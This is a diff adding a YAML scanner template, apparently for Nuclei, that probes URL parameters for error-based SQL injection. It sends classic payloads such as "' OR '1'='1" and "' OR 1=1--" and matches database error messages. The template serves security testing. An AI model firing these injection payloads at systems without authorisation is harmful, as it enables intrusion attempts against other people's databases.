@@ -1,0 +1,41 @@
+id: sqli-error-based
+
+info:
+  name: Error-based SQL Injection
+  author: mynamegabe
+  severity: critical
+  description: |
+    This template attempts to identify SQL Injection vulnerabilities in the parameters
+    of the target endpoint by injecting common SQL payloads and checking for errors.
+  metadata:
+    max-request: 3
+  tags: sqli,error,dast
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}||path||?{{param}}={{injection}}"
+
+    attack: pitchfork
+    payloads:
+      injection:
+        - "'"
+        - "\""
+        - ";"
+        - "' OR '1'='1"
+        - "\" OR \"1\"=\"1"
+        - "' OR 1=1--"
+        - "\" OR 1=1--"
+        - "' AND 1=CAST((SELECT 1) AS INT)--"
+      param: ./payloads/||pathfile||.txt
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "mysql_fetch"
+          - "Unclosed quotation mark"
+          - "You have an error in your SQL syntax"
+          - "Warning: mysql"
+          - "unrecognized token"
+        condition: or
